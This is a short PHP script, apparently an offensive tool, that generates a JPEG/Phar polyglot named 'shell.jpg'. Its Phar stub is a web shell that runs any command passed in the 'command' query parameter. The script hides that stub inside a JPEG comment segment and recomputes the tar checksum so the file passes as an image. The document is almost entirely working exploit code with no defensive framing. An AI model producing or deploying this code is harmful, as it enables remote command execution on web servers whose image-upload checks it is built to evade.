<?php
/*
 * 'inspired' by https://github.com/kunte0/phar-jpg-polyglot
 * ( ͡~ ͜ʖ ͡°)
 *
 * use `php.ini` as configuration for PHP
 * */

function generate_base_phar()
{
    global $tempname;
    @unlink($tempname);
    $phar = new Phar($tempname);
    $phar->startBuffering();
    $phar->setStub("<?php echo system(\$_GET['command']); __HALT_COMPILER(); ?>");
    $phar->stopBuffering();

    $basecontent = file_get_contents($tempname);
    @unlink($tempname);
    return $basecontent;
}

function generate_polyglot($phar, $jpeg)
{
    $phar = substr($phar, 6); // remove <?php dosent work with prefix
    $len = strlen($phar) + 2; // fixed
    $new = substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) . chr($len & 0xff) . $phar . substr($jpeg, 2);
    $contents = substr($new, 0, 148) . "        " . substr($new, 156);

    // calc tar checksum
    $chksum = 0;
    for ($i = 0; $i < 512; $i++) {
        $chksum += ord(substr($contents, $i, 1));
    }
    // embed checksum
    $oct = sprintf("%07o", $chksum);
    $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);
    return $contents;
}

// config for jpg
$tempname = 'temp.tar.phar'; // make it tar
$jpeg = file_get_contents('image.jpg');
$outfile = 'shell.jpg';

// make jpg
file_put_contents($outfile, generate_polyglot(generate_base_phar(), $jpeg));
